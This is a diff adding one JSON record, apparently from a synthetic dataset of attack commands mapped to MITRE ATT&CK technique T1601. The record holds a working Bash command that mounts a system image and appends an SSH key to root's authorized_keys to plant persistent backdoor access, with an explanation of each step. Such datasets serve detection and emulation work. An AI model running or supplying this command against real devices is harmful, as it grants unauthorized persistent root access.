@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ld=$(losetup -fP --show /var/tmp/modified_system.img) && mount ${ld}p1 /mnt/img && mkdir -p /mnt/img/root/.ssh && { [ -f /mnt/img/root/.ssh/authorized_keys ] && cp /mnt/img/root/.ssh/authorized_keys /tmp/ak.bak || touch /tmp/ak.bak; } && cat /opt/keys/adm_key.pub >> /mnt/img/root/.ssh/authorized_keys && diff -u /tmp/ak.bak /mnt/img/root/.ssh/authorized_keys && umount /mnt/img && losetup -d \"$ld\"",
+  "explanation": "Injects an SSH public key into the image's root account and diffs the authorized_keys file to confirm persistence embedded within the system image.",
+  "rationale_steps": [
+    "Mount the image filesystem with root privileges to modify sensitive files.",
+    "Append a key to root's authorized_keys inside the image to ensure access after flashing.",
+    "Diff the authorized_keys file before and after the change to verify modification."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-72818fd5",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
